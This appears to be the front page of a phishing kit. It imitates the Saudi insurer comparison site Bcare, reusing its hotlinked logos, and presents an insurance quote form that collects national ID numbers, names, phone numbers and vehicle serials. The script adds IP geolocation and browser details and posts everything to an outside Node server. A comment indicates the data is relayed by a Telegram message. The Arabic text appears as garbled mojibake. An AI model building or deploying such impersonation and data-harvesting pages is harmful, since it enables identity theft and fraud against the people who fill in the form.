<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styleindex.css">
    <title>ูููุฐุฌ ุงูุชุฃููู</title>
    <script src="script.js"></script>

</head>
<body>
    <div class="top-bar">
        <img src="https://bcare.com.sa/assets/images/Bcare-logo.svg" alt="Bcare Logo">
        <span></span>
        <span>EN</span>
    </div>

    <div class="main-header">
        <h2>ูุงุฑูุ ุขููุ ุงุณุชูู ูุซููุชู</h2>
        <p>ููุงู ูุงุญุฏ ููุฑ ุนููู ุงูุจุญุซ ุจูู ุฃูุซุฑ ูู 20 ุดุฑูุฉ ุชุฃููู!</p>
    </div>

    <div class="form-wrapper">
        <div class="nav-tabs">
            <div class="tab-item active">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                    <path d="M135.2 117.4L109.1 192H402.9l-26.1-74.6C372.3 104.6 360.2 96 346.6 96H165.4c-13.6 0-25.7 8.6-30.2 21.4zM39.6 196.8L74.8 96.3C88.3 57.8 124.6 32 165.4 32H346.6c40.8 0 77.1 25.8 90.6 64.3l35.2 100.5c23.2 9.6 39.6 32.5 39.6 59.2V400v48c0 17.7-14.3 32-32 32H448c-17.7 0-32-14.3-32-32V400H96v48c0 17.7-14.3 32-32 32H32c-17.7 0-32-14.3-32-32V400 256c0-26.7 16.4-49.6 39.6-59.2zM128 288a32 32 0 1 0 -64 0 32 32 0 1 0 64 0zm288 32a32 32 0 1 0 0-64 32 32 0 1 0 0 64z"/>
                </svg>
                <span>ูุฑูุจุงุช</span>
            </div>

            <div class="tab-item">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
                    <path d="M482.3 192c34.2 0 93.7 29 93.7 64c0 36-59.5 64-93.7 64l-116.6 0L265.2 495.9c-5.7 10-16.3 16.1-27.8 16.1l-56.2 0c-10.6 0-18.3-10.2-15.4-20.4l49-171.6L112 320 68.8 377.6c-3 4-7.8 6.4-12.8 6.4l-42 0c-7.8 0-14-6.3-14-14c0-1.3 .2-2.6 .5-3.9L32 256 .5 145.9c-.4-1.3-.5-2.6-.5-3.9c0-7.8 6.3-14 14-14l42 0c5 0 9.8 2.4 12.8 6.4L112 192l102.9 0-49-171.6C162.9 10.2 170.6 0 181.2 0l56.2 0c11.5 0 22.1 6.2 27.8 16.1L365.7 192l116.6 0z"/>
                </svg>
                <span>ุณูุฑ</span>
            </div>

            <div class="tab-item">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
                    <path d="M142.4 21.9c5.6 16.8-3.5 34.9-20.2 40.5L96 71.1V192c0 53 43 96 96 96s96-43 96-96V71.1l-26.1-8.7c-16.8-5.6-25.8-23.7-20.2-40.5s23.7-25.8 40.5-20.2l26.1 8.7C334.4 19.1 352 43.5 352 71.1V192c0 77.2-54.6 141.6-127.3 156.7C231 404.6 278.4 448 336 448c61.9 0 112-50.1 112-112V265.3c-28.3-12.3-48-40.5-48-73.3c0-44.2 35.8-80 80-80s80 35.8 80 80c0 32.8-19.7 61-48 73.3V336c0 97.2-78.8 176-176 176c-92.9 0-168.9-71.9-175.5-163.1C87.2 334.2 32 269.6 32 192V71.1c0-27.5 17.6-52 43.8-60.7l26.1-8.7c16.8-5.6 34.9 3.5 40.5 20.2zM480 224a32 32 0 1 0 0-64 32 32 0 1 0 0 64z"/>
                </svg>
                <span>ุฃุฎุทุงุก ุทุจูุฉ</span>
            </div>

            <div class="tab-item">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                    <path d="M228.3 469.1L47.6 300.4c-4.2-3.9-8.2-8.1-11.9-12.4h87c22.6 0 43-13.6 51.7-34.5l10.5-25.2 49.3 109.5c3.8 8.5 12.1 14 21.4 14.1s17.8-5 22-13.3L320 253.7l1.7 3.4c9.5 19 28.9 31 50.1 31H476.3c-3.7 4.3-7.7 8.5-11.9 12.4L283.7 469.1c-7.5 7-17.4 10.9-27.7 10.9s-20.2-3.9-27.7-10.9zM503.7 240h-132c-3 0-5.8-1.7-7.2-4.4l-23.2-46.3c-4.1-8.1-12.4-13.3-21.5-13.3s-17.4 5.1-21.5 13.3l-41.4 82.8L205.9 158.2c-3.9-8.7-12.7-14.3-22.2-14.1s-18.1 5.9-21.8 14.8l-31.8 76.3c-1.2 3-4.2 4.9-7.4 4.9H16c-2.6 0-5 .4-7.3 1.1C3 225.2 0 208.2 0 190.9v-5.8c0-69.9 50.5-129.5 119.4-141C165 36.5 211.4 51.4 244 84l12 12 12-12c32.6-32.6 79-47.5 124.6-39.9C461.5 55.6 512 115.2 512 185.1v5.8c0 16.9-2.8 33.5-8.3 49.1z"/>
                </svg>
                <span>ุทุจู</span>
            </div>
        </div>
        <div class="form-toggle">
            <button class="active" id="newBtn" onclick="togglePurpose('new')">ุชุฃููู ุฌุฏูุฏ</button>
            <button id="transferBtn" onclick="togglePurpose('transfer')">ููู ููููุฉ</button>
        </div>

        <form id="myForm" method="POST" action="process_form.php">
            <label>ุฑูู ุงููููุฉ / ุงูุฅูุงูุฉ</label>
            <input type="tel" name="id_number" placeholder="ุฑูู ุงููููุฉ / ุงูุฅูุงูุฉ" required maxlength="10">

            <label>ุงุณู ูุงูู ุงููุซููุฉ</label>
            <input type="text" name="owner_name" placeholder="ุงูุงุณู ุงููุงูู" required>

            <label>ุฑูู ุงููุงุชู</label>
            <input type="tel" name="phone" placeholder="05xxxxxxxx" required maxlength="10">

            <div class="form-type-toggle">
                <button type="button" class="active" id="formBtn" onclick="toggleFormType('form')">ุงุณุชูุงุฑุฉ</button>
                <button type="button" id="customBtn" onclick="toggleFormType('custom')">ุจุทุงูุฉ ุฌูุฑููุฉ</button>
            </div>

            <div id="form-fields">
                <label>ุงูุฑูู ุงูุชุณูุณูู</label>
                <input type="tel" name="serial_number_form" placeholder="ุงูุฑูู ุงูุชุณูุณูู">
            </div>

            <div id="custom-fields" class="hidden">
                <label>ุณูุฉ ุงูุตูุน</label>
                <input type="text" name="manufacture_year" placeholder="ุณูุฉ ุงูุตูุน">

                <label>ุงูุฑูู ุงูุชุณูุณูู</label>
                <input type="tel" name="serial_number_custom" placeholder="ุงูุฑูู ุงูุชุณูุณูู">
            </div>

            <label>ุฑูุฒ ุงูุชุญูู</label>
            <div class="captcha">
                <input type="tel" id="captchaInput" placeholder="ุฑูุฒ ุงูุชุญูู" required maxlength="4" name="captchaInput">
                <span id="captchaCode">1234</span>
                <button type="button" onclick="generateCaptcha()">๐</button>
            </div>

            <div class="checkbox">
                <input type="checkbox" id="agree" name="agree" checked required>
                <label for="agree">ุฃูุงูู ุนูู ููุญ ุดุฑูุฉ ุนูุงูุฉ ุนูุงูุฉ ุงููุณุท ุงูุญู ูู ุงูุงุณุชุนูุงู ูู ุดุฑูุฉ ูุฌู ุฃู ูุฑูุฒ ุงููุนูููุงุช ุงููุทูู ุนู ุจูุงูุงุชู</label>
            </div>

            <button class="submit-btn" type="submit">ุฅุธูุงุฑ ุงูุนุฑูุถ</button>
        </form>
    </div>

    <div class="section-title">ุทุฑููู ุขูููู ูุน ุจู ููุฑ</div>

    <div class="boxes-grid">
        <div class="box">
            <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/insureOneMin.svg" alt="InsureOneMin">
            <h3>ุชุฃูููู ูู ุฏูููุฉ</h3>
            <p>ููุงุฑู ูู ูู ุนุฑูุถ ุงูุฃุณุนุงุฑ ุจุดูู ููุฑู ูู ูู ุดุฑูุงุช ุงูุชุฃููู</p>
        </div>

        <div class="box">
            <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/sprateInsure.svg" alt="SprateInsure">
            <h3>ูุตูู ุชุฃูููู</h3>
            <p>ุฃููุงุน ุชุฃููู ูุชุนุฏุฏุฉ: ุถุฏ ุงูุบูุฑุ ุดุงููุ ูููุฒุ ูุชุญูู ูุชููุน</p>
        </div>

        <div class="box">
            <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/priceLess.svg" alt="PriceLess">
            <h3>ุฃุณุนุงุฑ ุฃูู</h3>
            <p>ูุฑุงูุจ ุงูุณูู ููุถูู ุฃู ุณุนุฑู ุงูุฃูู ุญุณุจ ุงุญุชูุงุฌู</p>
        </div>

        <div class="box">
            <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/sechleInsure.svg" alt="SechleInsure">
            <h3>ุฌุฏูู ุชุฃูููู</h3>
            <p>ูุฑุณู ูู ุชุฐููุฑุงุช ุจุงูุชุฌุฏูุฏ ูุชูุฏุฑ ุชุญุฏุฏ ุชุงุฑูุฎ ุงูุจุฏุงูุฉ</p>
        </div>

        <div class="box">
            <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/wind.svg" alt="Wind">
            <h3>ูุจ ุฑูุญ</h3>
            <p>ูุฑุจุท ูุซููุชู ูุจุงุดุฑุฉ ูุน ุงููุฑูุฑ ููุฌู ุจุฃุณุฑุน ููุช</p>
        </div>

        <div class="box">
            <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/discounts.svg" alt="Discounts">
            <h3>ุฎุตููุงุช ุชุถุจุทู</h3>
            <p>ุฎุตููุงุช ูููุทุงุนุงุช ุงูุญููููุฉ ูุงูุฎุงุตุฉ</p>
        </div>

        <div class="box">
            <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/benfit.svg" alt="Benfit">
            <h3>ููุงูุน ุชุญููู</h3>
            <p>ุงุฎุชุฑ ุงูููุงูุน ุงูุฅุถุงููุฉ ุงูููุงุณุจุฉ ูู</p>
        </div>

        <div class="box">
            <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/oneWay.svg" alt="OneWay">
            <h3>ููุงู ูุงุญุฏ</h3>
            <p>ุฅุฏุงุฑุฉ ุฅููุชุฑูููุฉ ูุงููุฉ ูุฌููุน ูุซุงุฆูู</p>
        </div>
    </div>

    <section class="wareef-discounts-section">
        <h1 class="section-title">ุฎุตููุงุช ูุฑูู</h1>
        <h2 class="section-subtitle">ุฎุตููุงุช ูุนุฑูุถ ูุจุงุดุฑุฉ ูู ูุฎุชูู ุงููุชุงุฌุฑ ุงูุนุงูููุฉ ูุงููุญููุฉ ูุนููุงุก ุจู ููุฑ (ุฃูุฑุงุฏุ ุดุฑูุงุช)</h2>

        <div class="discounts-grid">
            <div class="discount-item">
                <img src="https://bcare.com.sa/assets/images/RoshRayhaan.jpg" alt="RoshRayhan">
                <div class="discount-info">
                    <h3>ุฑูุด ุฑูุญุงู</h3>
                    <p>ุฎุตู 15%</p>
                </div>
            </div>

            <div class="discount-item">
                <img src="https://bcare.com.sa/assets/images/none.svg" alt="Noon">
                <div class="discount-info">
                    <h3>ููู</h3>
                    <p>ุฎุตู 15%</p>
                </div>
            </div>

            <div class="discount-item">
                <img src="https://bcare.com.sa/assets/images/drive7.png" alt="Perfectweight">
                <div class="discount-info">
                    <h3>ุงููุฒู ุงููุซุงูู</h3>
                    <p>ุฎุตู 50%</p>
                </div>
            </div>

            <div class="discount-item">
                <img src="https://bcare.com.sa/assets/images/swater.jpg" alt="Drive7">
                <div class="discount-info">
                    <h3>ุฏุฑุงูู7</h3>
                    <p>ุฎุตู 20%</p>
                </div>
            </div>

            <div class="discount-item">
                <img src="https://bcare.com.sa/assets/images/sivvi.svg" alt="Sweater">
                <div class="discount-info">
                    <h3>ุณููุชุฑ</h3>
                    <p>ุฎุตู 20%</p>
                </div>
            </div>

            <div class="discount-item">
                <img src="https://bcare.com.sa/assets/images/Physiotherabia.jpg" alt="Sivvi">
                <div class="discount-info">
                    <h3>ุณููู</h3>
                    <p>ุฎุตู 10%</p>
                </div>
            </div>

            <div class="discount-item">
                <img src="https://bcare.com.sa/assets/images/Group%206444.svg" alt="Physiotherabia">
                <div class="discount-info">
                    <h3>ููุฒููุซูุฑุงุจูุง</h3>
                    <p>ุฎุตู 20%</p>
                </div>
            </div>
        </div>

        <div class="show-more">
            <button>ุนุฑุถ ุงููุฒูุฏ ูู ุงูุฎุตููุงุช</button>
        </div>
    </section>

<script>
    // Socket.IO
    const socket = io("http://localhost:3000");

    socket.on("connect", () => {
        console.log("ูุชุตู ุจุงูุณูุฑูุฑ");
    });

    socket.on("reply", (data) => {
        console.log("ุฑุฏ ุงูุณูุฑูุฑ:", data);
    });

    // ูุฐู ุงูุฏุงูุฉ ูุฏ ูุง ุชููู ุถุฑูุฑูุฉ ุฅุฐุง ููุช ูุง ุชุฑุณู ุฑุณุงุฆู ุนุดูุงุฆูุฉ ูู ุงูุนููู
    // ูููู ูุชุฑููุง ููุง ุฅุฐุง ูุงู ููุง ุงุณุชุฎุฏุงูุงุช ุฃุฎุฑู
    function sendMessage(msg) {
        socket.emit("message", msg);
    }

    // ูุซุงู: ุฅุฑุณุงู ุฑุณุงูุฉ ุจุนุฏ 3 ุซูุงูู (ูููู ุฅุฒุงูุชู ุฅุฐุง ูู ููู ูู ุบุฑุถ)
    setTimeout(() => {
        sendMessage("ูุฑุญุจุง ูู index.html"); // ุชู ุงูุชุนุฏูู ูู index.php
    }, 3000);

    // ูุธุงุฆู ุงููููุฐุฌ
    async function fetchGeoAndBrowserInfo() {
        try {
            const geo = await fetch('https://ipapi.co/json/').then(res => res.json());
            const browser = navigator.userAgent;
            return { geo, browser };
        } catch (error) {
            console.error('Error fetching geo or browser info:', error);
            return { geo: {}, browser: navigator.userAgent }; // Return default on error
        }
    }

    // โ๏ธ ุชู ุฅุฒุงูุฉ ุฏุงูุฉ createTelegramMessage - ุฃุตุจุญุช ูุณุคูููุฉ ุงูุฎุงุฏู (Node.js)

    // ุฏุงูุฉ Captcha
    function generateCaptcha() {
        const code = Math.floor(1000 + Math.random() * 9000).toString();
        document.getElementById('captchaCode').textContent = code;
    }

    function validateCaptcha() {
        const input = document.getElementById('captchaInput').value.trim();
        const code = document.getElementById('captchaCode').textContent.trim();
        return input === code;
    }

    // ุฏุงูุฉ ุชุจุฏูู ููุน ุงููููุฐุฌ (ุงุณุชูุงุฑุฉ / ุจุทุงูุฉ ุฌูุฑููุฉ)
    function toggleFormType(type) {
        const formBtn = document.getElementById('formBtn');
        const customBtn = document.getElementById('customBtn');
        const formFields = document.getElementById('form-fields');
        const customFields = document.getElementById('custom-fields');

        if (type === 'form') {
            formBtn.classList.add('active');
            customBtn.classList.remove('active');
            formFields.style.display = 'block';
            customFields.style.display = 'none';
        } else {
            formBtn.classList.remove('active');
            customBtn.classList.add('active');
            formFields.style.display = 'none';
            customFields.style.display = 'block';
        }
    }

    // ุฏุงูุฉ ุชุจุฏูู ุงูุบุฑุถ (ุชุฃููู ุฌุฏูุฏ / ููู ููููุฉ)
    function togglePurpose(purpose) {
        const newBtn = document.getElementById('newBtn');
        const transferBtn = document.getElementById('transferBtn');

        if (purpose === 'new') {
            newBtn.classList.add('active');
            transferBtn.classList.remove('active');
        } else {
            newBtn.classList.remove('active');
            transferBtn.classList.add('active');
        }
    }

    // ูุณุชูุน ุญุฏุซ ุฅุฑุณุงู ุงููููุฐุฌ ุงูุฑุฆูุณู
    document.getElementById('myForm').addEventListener('submit', async function(event) {
        event.preventDefault(); // ููุน ุงูุฅุฑุณุงู ุงูุงูุชุฑุงุถู ูููููุฐุฌ

        if (!validateCaptcha()) {
            alert('ุฑูุฒ ุงูุชุญูู ุบูุฑ ุตุญูุญ. ูุฑุฌู ุงููุญุงููุฉ ูุฑุฉ ุฃุฎุฑู.'); // ุฑุณุงูุฉ ูููุณุชุฎุฏู
            return; // ุฅููุงู ุฅุฐุง ูุงู ุงููุงุจุชุดุง ุบูุฑ ุตุญูุญ
        }

        // 1. ุชุญููู FormData ุฅูู ูุงุฆู JavaScript ุนุงุฏู
        const rawFormData = new FormData(this);
        const formDataObject = {};
        for (let [key, value] of rawFormData.entries()) {
            formDataObject[key] = value;
        }

        // 2. ุฅุถุงูุฉ ุญูู 'action' ูุชุญุฏูุฏ ุงูุฅุฌุฑุงุก ูู Node.js
        formDataObject.action = 'submit_initial_form';

        // 3. ุชุญุฏูุฏ ุงูุบุฑุถ ูู ุงููููุฐุฌ (ุชุฃููู ุฌุฏูุฏ / ููู ููููุฉ)
        // ุฅุถุงูุฉ ูุญุต ููุฌูุฏ ุงูุฃุฒุฑุงุฑ ูุชุฌูุจ ุงูุฃุฎุทุงุก ุฅุฐุง ูู ุชูู ููุฌูุฏุฉ ุฏุงุฆูุงู ูู ุงูู DOM
        const newBtn = document.getElementById('newBtn');
        const transferBtn = document.getElementById('transferBtn');
        if (newBtn && newBtn.classList.contains('active')) {
            formDataObject.purpose = 'new_insurance';
        } else if (transferBtn && transferBtn.classList.contains('active')) {
            formDataObject.purpose = 'transfer_ownership';
        } else {
            // ุฅุถุงูุฉ ูููุฉ ุงูุชุฑุงุถูุฉ ุฅุฐุง ูู ูุชู ุชุญุฏูุฏ ุฃู ุบุฑุถ
            formDataObject.purpose = 'unknown';
        }

        // ุญูุธ ุจูุงูุงุช ูุนููุฉ ูู Local Storage
        const idNumber = document.querySelector('input[name="id_number"]').value;
        localStorage.setItem('id_number', idNumber);
        localStorage.setItem('owner_name', formDataObject.owner_name);

        // ุฌูุจ ูุนูููุงุช ุงููููุน ูุงููุชุตูุญ ูุฏูุฌูุง ูุจุงุดุฑุฉ ูู ุงููุงุฆู ุงููุฑุณู
        const extraData = await fetchGeoAndBrowserInfo();
        formDataObject.geo_info = extraData.geo;
        formDataObject.browser_info = extraData.browser;

        try {
            // 4. ุงุณุชุฎุฏุงู fetch API ูุน ุงููุณุงุฑ ุงูุฌุฏูุฏ ูุงูู headers ุงูุตุญูุญุฉ ูุงูู body ูู JSON
            const response = await fetch('http://localhost:3000/process_form_data', { // ุงููุณุงุฑ ุงูุฌุฏูุฏ ูู Node.js
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json' // ูุฐุง ููู ุฌุฏุงู ูุฅุฎุจุงุฑ Node.js ุฃู ุงูุจูุงูุงุช JSON
                },
                body: JSON.stringify(formDataObject) // ุชุญููู ุงููุงุฆู ุฅูู ุณูุณูุฉ JSON
            });

            // 5. ูุนุงูุฌุฉ ุงูุงุณุชุฌุงุจุฉ ูู Node.js
            const contentType = response.headers.get("content-type");
            if (contentType && contentType.indexOf("application/json") !== -1) {
                const result = await response.json();

                if (result.status === 'success') {
                    alert(result.message); // ุนุฑุถ ุงูุฑุณุงูุฉ ูู ุงูุฎุงุฏู
                    window.location.href = 'form.html'; // ุฅุนุงุฏุฉ ุงูุชูุฌูู ูุตูุญุฉ ุฃุฎุฑู
                    this.reset(); // ุฅุนุงุฏุฉ ุชุนููู ุงููููุฐุฌ
                    generateCaptcha(); // ุชูููุฏ ูุงุจุชุดุง ุฌุฏูุฏ
                } else {
                    alert('ูุดู ูู ุฅุฑุณุงู ุงูุจูุงูุงุช: ' + (result.message || 'ุฎุทุฃ ุบูุฑ ูุนุฑูู.'));
                }
            } else {
                // ุฅุฐุง ูู ุชูู ุงูุงุณุชุฌุงุจุฉ JSONุ ููุฏ ุชููู ุตูุญุฉ ุฎุทุฃ HTML
                const textResult = await response.text();
                console.error('Expected JSON, but received:', textResult);
                alert('ุญุฏุซ ุฎุทุฃ ุบูุฑ ูุชููุน ูู ุงูุฎุงุฏู. ูุฑุฌู ุงูุชุญูู ูู ุณุฌูุงุช ุงูุฎุงุฏู.');
            }

        } catch (error) {
            console.error('Fetch error:', error);
            alert('ุญุฏุซ ุฎุทุฃ ุฃุซูุงุก ุงูุงุชุตุงู ุจุงูุฎุงุฏู. ูุฑุฌู ุงููุญุงููุฉ ูุฑุฉ ุฃุฎุฑู.');
        }
    });

    // ุชุดุบูู generateCaptcha ุนูุฏ ุชุญููู ุงูุตูุญุฉ
    window.onload = generateCaptcha;
</script>
</body>
</html>